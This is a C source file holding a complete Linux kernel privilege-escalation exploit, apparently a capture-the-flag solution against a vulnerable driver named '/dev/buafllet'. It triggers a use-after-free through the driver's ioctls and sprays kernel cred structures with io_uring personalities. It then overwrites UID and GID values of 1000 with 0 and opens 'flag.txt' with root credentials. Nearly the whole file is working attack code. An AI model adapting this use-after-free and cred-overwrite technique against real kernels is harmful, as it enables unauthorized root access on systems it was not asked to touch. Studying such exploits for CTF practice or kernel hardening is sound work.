#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <linux/capability.h>
#include <linux/io_uring.h> 
#include <fcntl.h> 
#include <sched.h>
#include <syscall.h>
#include <unistd.h>

// max 12287 min 1169
// GFP_KERNEL __GFP_ZERO
#define CMD_ALLOC 0x10
#define CMD_FREE 0x11
#define CMD_READ 0x12
#define CMD_WRITE 0x13

struct app_io_sq_ring {
  unsigned *head;
  unsigned *tail;
  unsigned *ring_mask;
  unsigned *ring_entries;
  unsigned *flags;
  unsigned *array;
};

struct app_io_cq_ring {
  unsigned *head;
  unsigned *tail;
  unsigned *ring_mask;
  unsigned *ring_entries;
  struct io_uring_cqe *cqes;
};

struct submitter {
  unsigned int ring_fd;
  struct app_io_sq_ring sq_ring;
  struct io_uring_sqe* sqes;
  struct app_io_cq_ring cq_ring;
};

int fd,rc;
struct submitter subms[8]; // we need this struct so we handle a lot of objects

void handle(char *string){
  perror(string);
  close(fd);
  exit(0);
}


#define read_barrier()  __asm__ __volatile__("":::"memory")
#define write_barrier() __asm__ __volatile__("":::"memory")

int io_uring_register(unsigned int ring_fd, unsigned int opcode, void* arg, unsigned int nr_args) {
  return (int)syscall(SYS_io_uring_register, ring_fd, opcode, arg, nr_args);
}

int io_uring_setup(unsigned int entries, struct io_uring_params* p) {
  return (int)syscall(SYS_io_uring_setup, entries, p);
}

int io_uring_enter(unsigned int ring_fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags) {
  return (int)syscall(SYS_io_uring_enter, ring_fd, to_submit, min_complete, flags, NULL, 0);
}

int app_setup_uring(struct submitter *s, unsigned int entries)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_params p;
    void *sq_ptr, *cq_ptr;

    /*
     * We need to pass in the io_uring_params structure to the io_uring_setup()
     * call zeroed out. We could set any flags if we need to, but for this
     * example, we don't.
     * */
    memset(&p, 0, sizeof(p));
    //p.flags = IORING_SETUP_SQPOLL;
    //p.sq_thread_idle = 1000;
    p.wq_fd = -1;
    s->ring_fd = io_uring_setup(entries, &p);     // SQ/CQ with at least 1 entry
    if (s->ring_fd < 0) {
        perror("io_uring_setup");
        return 1;
    }

    /*
     * io_uring communication happens via 2 shared kernel-user space ring buffers,
     * which can be jointly mapped with a single mmap() call in recent kernels. 
     * While the completion queue is directly manipulated, the submission queue 
     * has an indirection array in between. We map that in as well.
     * */

    int sring_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    int cring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);

    /* In kernel version 5.4 and above, it is possible to map the submission and 
     * completion buffers with a single mmap() call. Rather than check for kernel 
     * versions, the recommended way is to just check the features field of the 
     * io_uring_params structure, which is a bit mask. If the 
     * IORING_FEAT_SINGLE_MMAP is set, then we can do away with the second mmap()
     * call to map the completion ring.
     * */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        if (cring_sz > sring_sz) {
            sring_sz = cring_sz;
        }
        cring_sz = sring_sz;
    }

    /* Map in the submission and completion queue ring buffers.
     * Older kernels only map in the submission queue, though.
     * */
    sq_ptr = mmap(0, sring_sz, PROT_READ | PROT_WRITE, 
            MAP_SHARED | MAP_POPULATE,
            s->ring_fd, IORING_OFF_SQ_RING);
    if (sq_ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        cq_ptr = sq_ptr;
    } else {
        /* Map in the completion queue ring buffer in older kernels separately */
        cq_ptr = mmap(0, cring_sz, PROT_READ | PROT_WRITE, 
                MAP_SHARED | MAP_POPULATE,
                s->ring_fd, IORING_OFF_CQ_RING);
        if (cq_ptr == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
    }
    /* Save useful fields in a global app_io_sq_ring struct for later
     * easy reference */
    sring->head = sq_ptr + p.sq_off.head;
    sring->tail = sq_ptr + p.sq_off.tail;
    sring->ring_mask = sq_ptr + p.sq_off.ring_mask;
    sring->ring_entries = sq_ptr + p.sq_off.ring_entries;
    sring->flags = sq_ptr + p.sq_off.flags;
    sring->array = sq_ptr + p.sq_off.array;

    /* Save useful fields in a global app_io_cq_ring struct for later
     * easy reference */
    cring->head = cq_ptr + p.cq_off.head;
    cring->tail = cq_ptr + p.cq_off.tail;
    cring->ring_mask = cq_ptr + p.cq_off.ring_mask;
    cring->ring_entries = cq_ptr + p.cq_off.ring_entries;
    cring->cqes = cq_ptr + p.cq_off.cqes;

    /* Map in the submission queue entries array */
    s->sqes = mmap(0, p.sq_entries * sizeof(struct io_uring_sqe),
            PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
            s->ring_fd, IORING_OFF_SQES);
    if (s->sqes == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    return 0;
}

int alloc_cred(unsigned int ring_fd) {
  int rc;

  struct __user_cap_header_struct cap_hdr = {
    .pid = 0,
    .version = _LINUX_CAPABILITY_VERSION_3
  };

  struct __user_cap_data_struct cap_data[2] = {
    {.effective = 0, .inheritable = 0, .permitted = 0},
    {.effective = 0, .inheritable = 0, .permitted = 0}
  };

  rc = syscall(SYS_capset, &cap_hdr, cap_data);
  if (rc < 0) {
    perror("[!] capset(&cap_hdr, cap_data)");
    return -1;
  }

  rc = io_uring_register(ring_fd, IORING_REGISTER_PERSONALITY, 0, 0);
  if (rc < 0) {
    perror("[!] io_uring_register(ring_fd, IORING_REGISTER_PERSONALITY, 0, 0)");
    return -1;
  }

  return 0;
}

int submit_to_sq(struct submitter *s, struct io_uring_sqe *sqes, unsigned int sqe_len, unsigned int min_complete) {
  int rc;
  unsigned int index, head, tail, next_tail, mask, to_submit;
  struct io_uring_sqe* sqe;
  struct app_io_sq_ring *sring = &s->sq_ring;

  /* assume unique submitter, i.e. tail does not change */
  next_tail = tail = *sring->tail;

  /* Add our submission queue entry to the tail of the SQE ring buffer */
  for (to_submit = 0; to_submit < sqe_len; to_submit++) {
    read_barrier();
    head = *sring->head;      // this may change as kernel processes sqe
    mask = *s->sq_ring.ring_mask;   // ...but does this ever change?

    // SQ full (tail wrapped back to head)
    if ((head & mask) == (tail & mask) && head != tail) {
      break;
    }

    next_tail++;
    index = tail & mask;
    sqe = &s->sqes[index];
    memcpy(sqe, &sqes[to_submit], sizeof(*sqe));
    sring->array[index] = index;
    tail = next_tail;
  }

  /* Update the tail so the kernel can see it. */
  if(*sring->tail != tail) {
    *sring->tail = tail;
    write_barrier();
  }

  /*
   * Tell the kernel we have submitted events with the io_uring_enter() system
   * call. We also pass in the IOURING_ENTER_GETEVENTS flag which causes the
   * io_uring_enter() call to wait until min_complete events (the 3rd param)
   * complete.
   * */
  rc = io_uring_enter(s->ring_fd, to_submit, min_complete, IORING_ENTER_GETEVENTS);
  if(rc < 0) {
    perror("io_uring_enter");
    return rc;
  }

  return to_submit;
}

int read_from_cq(struct submitter *s, int print, int *reaped_success, int *results) {
  struct app_io_cq_ring *cring = &s->cq_ring;
  struct io_uring_cqe *cqe;
  unsigned head, reaped = 0, success = 0;

  head = *cring->head;

  do {
    read_barrier();
    /*
     * Remember, this is a ring buffer. If head == tail, it means that the
     * buffer is empty.
     * */
    if (head == *cring->tail)
      break;

    /* Get the entry */
    cqe = &cring->cqes[head & *s->cq_ring.ring_mask];
    if (print) {
      if (cqe->res < 0)
        printf("cqe: res = %d (error: %s), user_data = 0x%llx\n", cqe->res, strerror(abs(cqe->res)), cqe->user_data);
      else
        printf("cqe: res = %d, user_data = 0x%llx\n", cqe->res, cqe->user_data);
    }
    if (cqe->res >= 0) {
      success++;
      if (results)
        *results++ = cqe->res;
    }

    head++;
    reaped++;
  } while (1);

  *cring->head = head;
  write_barrier();

  if (reaped_success != NULL)
    *reaped_success = success;

  return reaped;
}
// functions that check if the second field is a cred parameter
int check_leak_success(void* buf) {
  return ((unsigned int*)buf)[2] == 1000;
}

void dump_hex(char* buf, size_t sz) {
  size_t i;
  char s[] = "%#018lxA";
  for (i = 0; i < sz; i += 8) {
    s[7] = (i + 8) % 16 == 0 ? '\n' : ' ';
    printf(s, *(unsigned long*)&buf[i]);
  }
}

int read_flag(struct submitter* s, size_t ps) {
  struct io_uring_sqe sqe;
  int rc, root_fd, reaped_success, flag_fd;
  size_t i;
  char buf[128];

  flag_fd = -1;
// opening the uring fd where we are root
  rc = root_fd = open("/", O_RDONLY | O_DIRECTORY);
  if (rc < 0) {
    handle("open");
  }
  
  memset(&sqe, 0, sizeof(sqe));
  sqe.opcode = IORING_OP_OPENAT;
  sqe.fd = root_fd;
  sqe.addr = (uint64_t)"flag.txt";
  sqe.open_flags = O_RDONLY;
  sqe.len = 0;
  sqe.file_index = 0;

  reaped_success = 0;
  for (i = 0; i < ps && !reaped_success; ++i) {
    sqe.personality = i + 1;
    rc = submit_to_sq(s, &sqe, 1, 1);
    if (rc < 0)
      handle("submit_to_sq");
    rc = read_from_cq(s, 0, &reaped_success, &flag_fd);
    if (rc < 0)
      handle("read_from_cq");
  }
  if (!reaped_success) {
    puts("[!] could not open flag");
    handle("read flag");
  }

  rc = read(flag_fd, buf, sizeof(buf));
  if (rc < 0) {
    handle("read");
  }
  //writing out the flag :)
  write(1, buf, rc);
  return rc = 0;
}

void found(void * buff , int j,  int i){
  int *pbuf;
  int rc;
  dump_hex(buff,1024);
  puts("[!] Editing every field 1000 --> 0");
  // founding the field 1000 current UID and GUID and setting it to  0
  for (pbuf = (int*)buff; (void*)pbuf < &buff[0x1000]; ++pbuf) {
    if (*pbuf == 1000)
      *pbuf = 0;
  }
  // writing back the cred struct with 0 as UID and GUID
  rc = ioctl(fd , CMD_WRITE, buff);
  if(rc){
    handle("ioctl");
  }
  
  rc = read_flag(&subms[i], j);
  if (rc < 0) {
    puts("[!] could not read flag");
    handle("dc");
  }

  rc = 0;
}
int main(){
  size_t i,j;
  char buff_print[0xffff];
  int root_fd;
  puts("START EXPLOIT!");
  fd  = open("/dev/buafllet" ,O_RDWR);
  if(fd<0)
    handle("open");
  // creating the allocation outside the biggest cache handler max 0x2000
  puts("[+] Creating allocation > 8k");
  size_t size= 0x2fff;
  rc = ioctl(fd , CMD_ALLOC , &size );
  if(rc){
    handle("ioctl");
  }
  //freeing the allocation inside my dedicated page
  puts("[+] Freeing the allocation > 8k");
  rc = ioctl(fd , CMD_FREE);
  if(rc){
    handle("ioctl");
  }
    
  puts("[!] Spraying a lot of cred");

  for (i = 0; i < sizeof(subms) / sizeof(subms[0]); ++i) {
    //setupping uring
    rc = app_setup_uring(&subms[i] , 1);
    if (rc < 0)
      handle("app_setup_uring");
    //sprayng a lot of cred struct
    for (j = 0 ; ; ++j) {
      rc = alloc_cred(subms[i].ring_fd);
      if(rc < 0)
        break;
      //reading the content of our allocation and saving the output in buff_print
      rc = ioctl(fd , CMD_READ , buff_print);
      if(rc < 0){
        handle("ioctl");
      }
      if(check_leak_success(buff_print)){
        root_fd = j;
        found(buff_print , root_fd , i);
        exit(0);
      }
    }
  }  
}
